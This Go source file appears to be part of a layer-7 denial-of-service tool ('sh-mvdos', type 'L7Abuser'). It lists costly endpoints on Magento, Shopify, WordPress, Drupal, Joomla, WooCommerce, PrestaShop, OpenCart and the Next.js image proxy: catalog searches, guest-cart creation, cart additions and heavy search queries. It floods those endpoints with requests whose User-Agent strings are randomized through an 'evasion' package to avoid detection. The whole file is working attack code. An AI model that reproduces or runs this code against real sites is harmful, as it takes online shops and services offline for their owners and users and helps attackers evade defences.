package worker

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"

	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
	"github.com/kjsst/sh-mvdos/internal/worker/payload"
)

// cmsStressEndpoint describes one expensive CMS/application request pattern.
type cmsStressEndpoint struct {
	ID     string
	CMS    string // empty = generic
	Method string
	Path   func(base string) string
	Body   func() (string, string) // body, contentType; nil for GET
}

var cmsStressCatalog = []cmsStressEndpoint{
	{ID: "magento-catalog-search", CMS: "Magento", Method: http.MethodGet, Path: func(string) string { return payload.MagentoCatalogSearchPath() }},
	{ID: "magento-guest-cart", CMS: "Magento", Method: http.MethodPost, Path: func(string) string { return "/rest/default/V1/guest-carts" },
		Body: func() (string, string) { return "{}", "application/json" }},
	{ID: "magento-cart-item", CMS: "Magento", Method: http.MethodPost, Path: func(string) string { return "/rest/default/V1/guest-carts/1/items" },
		Body: func() (string, string) { return payload.MagentoGuestCartBody(), "application/json" }},
	{ID: "shopify-search", CMS: "Shopify", Method: http.MethodGet, Path: func(string) string { return payload.ShopifySearchPath() }},
	{ID: "shopify-cart-add", CMS: "Shopify", Method: http.MethodPost, Path: func(string) string { return "/cart/add.js" },
		Body: func() (string, string) {
			return fmt.Sprintf(`{"id":%d,"quantity":%d}`, 1000000+rand.Intn(9999999), 1+rand.Intn(3)), "application/json"
		}},
	{ID: "drupal-search", CMS: "Drupal", Method: http.MethodGet, Path: func(string) string { return payload.DrupalSearchPath() }},
	{ID: "joomla-search", CMS: "Joomla", Method: http.MethodGet, Path: func(string) string { return payload.JoomlaSearchPath() }},
	{ID: "wp-search", CMS: "WordPress", Method: http.MethodGet, Path: func(string) string { return payload.WordPressSearchPath() }},
	{ID: "woocommerce-search", CMS: "WooCommerce", Method: http.MethodGet, Path: func(string) string { return payload.WooCommerceSearchPath() }},
	{ID: "prestashop-search", CMS: "PrestaShop", Method: http.MethodGet, Path: func(string) string { return payload.PrestaShopSearchPath() }},
	{ID: "opencart-search", CMS: "OpenCart", Method: http.MethodGet, Path: func(string) string { return payload.OpenCartSearchPath() }},
	{ID: "next-image-proxy", CMS: "Next.js", Method: http.MethodGet, Path: func(base string) string { return payload.NextImageProxyPath(hostFromBase(base)) }},
	{ID: "generic-site-search", CMS: "", Method: http.MethodGet, Path: func(string) string {
		return "/search?q=" + url.QueryEscape(payload.HeavySearchQuery())
	}},
	{ID: "generic-catalog", CMS: "", Method: http.MethodGet, Path: func(string) string {
		return "/catalogsearch/result/?q=" + url.QueryEscape(payload.HeavySearchQuery())
	}},
}

func hostFromBase(base string) string {
	u, err := url.Parse(base)
	if err != nil || u.Host == "" {
		return strings.TrimPrefix(strings.TrimPrefix(base, "https://"), "http://")
	}
	return u.Host
}

func cmsEndpointsFor(cms string) []cmsStressEndpoint {
	cms = strings.TrimSpace(cms)
	if cms == "" {
		return cmsStressCatalog
	}
	var out []cmsStressEndpoint
	for _, ep := range cmsStressCatalog {
		if ep.CMS == "" || strings.EqualFold(ep.CMS, cms) {
			out = append(out, ep)
		}
	}
	if len(out) == 0 {
		return cmsStressCatalog
	}
	return out
}

func cmsEndpointByMode(mode string) (cmsStressEndpoint, bool) {
	mode = strings.ToLower(strings.TrimSpace(mode))
	aliases := map[string]string{
		"catalog-search": "magento-catalog-search",
		"magento-search": "magento-catalog-search",
		"magento-cart":   "magento-guest-cart",
		"shopify-search": "shopify-search",
		"drupal-search":  "drupal-search",
		"joomla-search":  "joomla-search",
		"wp-search":      "wp-search",
		"woocommerce":    "woocommerce-search",
		"next-image":     "next-image-proxy",
	}
	if id, ok := aliases[mode]; ok {
		mode = id
	}
	for _, ep := range cmsStressCatalog {
		if ep.ID == mode {
			return ep, true
		}
	}
	return cmsStressEndpoint{}, false
}

func (w *L7Abuser) cmsStressOnce(ctx context.Context, mode string, seq int, client *http.Client) error {
	if ep, ok := cmsEndpointByMode(mode); ok {
		return w.cmsRequest(ctx, client, ep)
	}
	eps := cmsEndpointsFor(w.CMS)
	if len(eps) == 0 {
		eps = cmsStressCatalog
	}
	ep := eps[seq%len(eps)]
	return w.cmsRequest(ctx, client, ep)
}

func (w *L7Abuser) cmsRequest(ctx context.Context, client *http.Client, ep cmsStressEndpoint) error {
	base := w.targetURL()
	path := ep.Path(base)
	fullURL := base + path

	var bodyReader io.Reader
	method := ep.Method
	if ep.Body != nil {
		body, ct := ep.Body()
		bodyReader = strings.NewReader(body)
		req, err := http.NewRequestWithContext(ctx, method, fullURL, bodyReader)
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", ct)
		req.Header.Set("User-Agent", evasion.RandUA())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "keep-alive")
		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		return nil
	}

	req, err := http.NewRequestWithContext(ctx, method, fullURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", evasion.RandUA())
	req.Header.Set("Accept", "text/html,application/json,*/*;q=0.8")
	req.Header.Set("Connection", "keep-alive")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

// CMSStressModes lists L7 modes that hit CMS-specific expensive endpoints.
func CMSStressModes() []string {
	return []string{
		"catalog-search", "magento-search", "magento-cart", "magento-guest-cart",
		"shopify-search", "drupal-search", "joomla-search", "wp-search",
		"woocommerce-search", "prestashop-search", "opencart-search", "next-image",
		"cms-rotate", "cmsstress",
	}
}